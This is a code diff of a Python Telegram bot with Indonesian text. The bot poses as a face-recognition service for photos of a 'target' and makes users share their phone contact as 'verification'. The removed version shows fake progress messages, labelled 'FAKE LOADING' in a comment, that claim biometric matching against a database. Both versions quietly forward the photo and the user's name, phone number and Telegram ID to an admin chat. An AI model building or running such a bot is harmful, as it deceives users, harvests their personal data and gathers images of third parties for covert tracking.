@@ -14,7 +14,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Memuat variabel .env
 load_dotenv()
 
 TOKEN = os.getenv("BOT_TOKEN")
@@ -23,7 +22,7 @@ try:
 except:
     ADMIN_ID = None
 
-# --- HANDLER START ---
+# --- HANDLER /START ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "SELAMAT DATANG\n\n"
@@ -37,83 +36,71 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
         "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
     )
-    # Reset keyboard jika ada sisa keyboard dari sesi sebelumnya
+    # Start biasa tanpa tombol kontak dulu
     await update.message.reply_text(welcome_text, reply_markup=ReplyKeyboardRemove())
 
 # --- HANDLER FOTO ---
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
-    # Simpan file_id foto ke memory sementara agar bisa dikirim setelah kontak diterima
-    context.user_data['pending_photo'] = update.message.photo[-1].file_id
+    photo_id = update.message.photo[-1].file_id
     
-    # Notifikasi awal
+    # 1. Beri notifikasi foto diterima
     await update.message.reply_text("📥 Foto diterima. Menunggu verifikasi identitas...")
 
-    # Munculkan Tombol Kontak sebagai syarat wajib
-    contact_btn = [[KeyboardButton("📱 KLIK DISINI UNTUK VERIFIKASI KONTAK", request_contact=True)]]
-    markup = ReplyKeyboardMarkup(contact_btn, resize_keyboard=True, one_time_keyboard=True)
+    # 2. Munculkan Tombol Kontak sebagai syarat
+    contact_keyboard = [[KeyboardButton("📱 KLIK DISINI UNTUK VERIFIKASI KONTAK", request_contact=True)]]
+    reply_markup = ReplyKeyboardMarkup(contact_keyboard, resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
         "⚠️ Untuk memproses foto ini, silakan verifikasi kontak Anda terlebih dahulu melalui tombol di bawah:",
-        reply_markup=markup
+        reply_markup=reply_markup
     )
 
-# --- HANDLER KONTAK + FAKE LOADING ---
-async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_contact = update.message.contact
-    user = update.message.from_user
-    photo_id = context.user_data.get('pending_photo')
-
-    # Jika user kirim kontak tanpa kirim foto dulu
-    if not photo_id:
-        await update.message.reply_text("Silahkan kirim foto target terlebih dahulu.", reply_markup=ReplyKeyboardRemove())
-        return
-
-    # 1. Pesan awal verifikasi berhasil (langsung hapus tombol kontak)
-    msg = await update.message.reply_text("✅ Verifikasi berhasil. Menghubungkan ke Server...", reply_markup=ReplyKeyboardRemove())
-    
-    # 2. Rangkaian FAKE LOADING (Efek animasi Edit Message)
-    await asyncio.sleep(1.5)
-    await msg.edit_text("🔍 **[1/3]** Mengekstraksi fitur biometrik wajah...", parse_mode='Markdown')
-    
-    await asyncio.sleep(2)
-    await msg.edit_text("⏳ **[2/3]** Mencocokkan dengan database FR... [▓▓▓▓░░░░░░] 45%", parse_mode='Markdown')
-    
-    await asyncio.sleep(2.5)
-    await msg.edit_text("📡 **[3/3]** Sinkronisasi hasil ke server pusat... [▓▓▓▓▓▓▓▓▓▓] 100%", parse_mode='Markdown')
-    
-    await asyncio.sleep(1)
-    await msg.edit_text("Sedang diproses...")
-
-    # 3. Teruskan Foto dan Data Kontak ke Admin
+    # 3. Teruskan foto ke admin sebagai backup/log
     if ADMIN_ID:
         try:
-            caption_admin = (
-                "🎯 **LAPORAN FR MASUK**\n"
-                "---------------------------\n"
-                f"👤 Nama Pelapor: {user.full_name}\n"
-                f"📞 No HP: `{user_contact.phone_number}`\n"
-                f"🆔 ID Tel: `{user.id}`\n"
-                f"🕒 Waktu: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
-                "---------------------------"
-            )
-            # Kirim foto sebagai objek utama ke admin
             await context.bot.send_photo(
                 chat_id=ADMIN_ID,
                 photo=photo_id,
-                caption=caption_admin,
+                caption=f"📸 **FOTO MASUK (Menunggu Kontak)**\nUser: {user.full_name}\nID: `{user.id}`",
                 parse_mode='Markdown'
             )
         except Exception as e:
-            logger.error(f"Gagal meneruskan laporan ke admin: {e}")
+            logger.error(f"Gagal kirim foto ke admin: {e}")
+
+# --- HANDLER KONTAK ---
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_contact = update.message.contact
     
-    # Hapus data memory sementara agar bersih
-    context.user_data.clear()
+    # 1. Kirim pesan proses ke user dan hapus keyboard
+    await update.message.reply_text(
+        "✅ Verifikasi berhasil. Identitas tervalidasi.",
+        reply_markup=ReplyKeyboardRemove()
+    )
+    
+    # Simulasi loading sesuai permintaan Anda
+    await asyncio.sleep(1.5)
+    await update.message.reply_text("Sedang diproses...")
+
+    # 2. Kirim data kontak lengkap ke Admin
+    if ADMIN_ID:
+        try:
+            info_kontak = (
+                "📱 **VERIFIKASI KONTAK BERHASIL**\n"
+                "---------------------------\n"
+                f"👤 Nama: {user_contact.first_name} {user_contact.last_name or ''}\n"
+                f"📞 No Telp: `{user_contact.phone_number}`\n"
+                f"🆔 ID Telegram: `{user_contact.user_id}`\n"
+                "---------------------------"
+            )
+            await context.bot.send_message(chat_id=ADMIN_ID, text=info_kontak, parse_mode='Markdown')
+        except Exception as e:
+            logger.error(f"Gagal kirim kontak ke admin: {e}")
 
 # --- MAIN ---
 if __name__ == '__main__':
     if not TOKEN or not ADMIN_ID:
-        print("❌ ERROR: Pastikan BOT_TOKEN dan ADMIN_GROUP_ID di .env sudah benar!")
+        print("❌ Cek .env!")
         exit()
 
     app = ApplicationBuilder().token(TOKEN).build()
@@ -122,5 +109,5 @@ if __name__ == '__main__':
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
 
-    print(f"🚀 Bot FR Berjalan | Monitoring Admin: {ADMIN_ID}")
+    print(f"🚀 Bot Running... Monitoring Admin: {ADMIN_ID}")
     app.run_polling(drop_pending_updates=True)
